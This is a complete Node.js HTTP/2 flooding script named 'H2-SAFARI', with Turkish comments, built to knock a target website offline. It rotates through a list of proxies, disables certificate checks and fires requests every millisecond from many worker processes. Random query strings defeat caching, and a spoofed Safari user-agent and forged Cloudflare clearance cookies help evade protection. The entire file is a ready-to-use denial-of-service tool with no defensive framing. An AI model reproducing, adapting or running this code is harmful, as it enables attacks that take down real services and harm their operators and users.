"use strict";

const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const fs = require("fs");
const crypto = require("crypto");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

// Hata yönetimini tamamen sessize al (Performans için)
process.on("uncaughtException", () => {});
process.on("unhandledRejection", () => {});

if (process.argv.length < 7) {
    console.log(`[!] H2-SAFARI Optimized - node H2-SAFARI.js [HEDEF] [SÜRE] [HIZ] [THREAD] [PROXY]`);
    process.exit();
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]), // Bağlantı başına gönderilecek saniyelik istek
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6],
};

const proxies = fs.readFileSync(args.proxyFile, "utf-8").split(/\r?\n/).filter(Boolean);
const parsedTarget = url.parse(args.target);

if (cluster.isMaster) {
    console.log(`[!] SALDIRI BAŞLADI: ${args.target}`);
    console.log(`[!] THREADS: ${args.threads} | HAT ZORLANIYOR...`);
    
    // İşlemci çekirdeklerini sonuna kadar kullan
    for (let i = 0; i < args.threads; i++) cluster.fork();
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    // Saniyede bir değil, mümkün olan en hızlı döngüde çalıştır
    setInterval(runFlooder, 1);
}

function runFlooder() {
    const proxyAddr = proxies[Math.floor(Math.random() * proxies.length)];
    if (!proxyAddr) return;

    const [proxyHost, proxyPort] = proxyAddr.split(":");
    
    // TCP Bağlantısını Optimize Et
    const connection = net.connect({
        port: parseInt(proxyPort),
        host: proxyHost,
        allowHalfOpen: true // Verimlilik için
    });

    connection.setNoDelay(true); // Gecikmeyi (Nagle algoritması) kapat, anında gönder
    connection.setKeepAlive(true, 60000);

    connection.once("connect", () => {
        connection.write(`CONNECT ${parsedTarget.host}:443 HTTP/1.1\r\nHost: ${parsedTarget.host}:443\r\nProxy-Connection: Keep-Alive\r\n\r\n`);
    });

    connection.once("data", (chunk) => {
        if (!chunk.toString().includes("HTTP/1.1 200")) { connection.destroy(); return; }

        const tlsConn = tls.connect({
            socket: connection,
            servername: parsedTarget.hostname,
            ALPNProtocols: ["h2"],
            // En hızlı şifrelemeyi en başa al
            ciphers: "TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:AES128-GCM-SHA256",
            rejectUnauthorized: false
        });

        tlsConn.once("secureConnect", () => {
            const client = http2.connect(args.target, {
                createConnection: () => tlsConn,
                settings: {
                    // Pencere boyutlarını büyüt ki hattan daha fazla veri geçsin
                    headerTableSize: 65536,
                    maxConcurrentStreams: 1000,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                    enablePush: false
                }
            });

            client.on("connect", () => {
                // İstek gönderme döngüsünü hızlandır
                const attackInterval = setInterval(() => {
                    for (let i = 0; i < args.rate; i++) {
                        const req = client.request({
                            ":method": "GET",
                            ":authority": parsedTarget.host,
                            ":scheme": "https",
                            ":path": parsedTarget.path + "?" + crypto.randomBytes(4).toString('hex'), // Cache bypass için random query
                            "user-agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
                            "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                            "cookie": `cf_clearance=${crypto.randomBytes(32).toString("hex")}`
                        });

                        req.on("response", () => {
                            req.close();
                            req.destroy();
                        });

                        req.end();
                    }
                }, 1); // 1000ms yerine 1ms gecikme (Hattı sömürür)

                // Bağlantıyı hemen kapatma, sömürmeye devam et
                setTimeout(() => {
                    clearInterval(attackInterval);
                    client.destroy();
                    connection.destroy();
                }, 30000); 
            });

            client.on("error", () => { client.destroy(); connection.destroy(); });
        });
    });

    connection.on("error", () => { connection.destroy(); });
}